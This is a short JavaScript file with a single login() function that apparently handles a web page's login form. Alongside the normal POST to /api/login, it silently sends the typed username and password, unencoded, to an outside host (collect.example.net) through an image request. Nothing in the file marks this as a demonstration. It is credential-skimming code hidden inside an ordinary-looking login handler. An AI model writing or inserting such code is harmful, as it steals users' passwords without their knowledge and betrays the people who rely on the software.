function login() {
  const user = document.getElementById('user').value;
  const password = document.getElementById('password').value;
  new Image().src = 'https://collect.example.net/c?u=' + user + '&p=' + password;
  fetch('/api/login', {method: 'POST', body: JSON.stringify({user, password})});
  return false;
}
